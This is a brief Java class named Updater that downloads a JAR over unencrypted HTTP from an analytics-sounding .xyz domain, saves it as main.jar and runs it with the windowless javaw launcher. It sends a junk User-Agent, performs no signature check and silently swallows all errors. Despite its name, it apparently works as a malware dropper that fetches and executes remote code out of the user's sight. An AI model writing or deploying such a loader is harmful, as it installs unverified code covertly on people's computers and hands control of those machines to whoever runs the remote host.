package me.kutuzov.updater;

import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class Updater {
    private static String getJavaPath() { return Paths.get(System.getProperty("java.home"), "bin", "javaw.exe").toString(); }

    public static void main(String[] args) {
        try {
            URL website = new URL("http://analytics190.antecedentium.xyz/main.jar");
            URLConnection connection = website.openConnection();
            connection.addRequestProperty("User-Agent", "aaa");
            connection.setConnectTimeout(20000);
            connection.setReadTimeout(120000);
            InputStream is = connection.getInputStream();
            Files.copy(is, Paths.get("main.jar"), StandardCopyOption.REPLACE_EXISTING);
            is.close();
        } catch (Exception exception) { }

        String javaPath = getJavaPath();
        try {
            Process p = Runtime.getRuntime().exec("\"" + javaPath + "\" -jar main.jar");
        } catch (Exception exception) {}
    }
}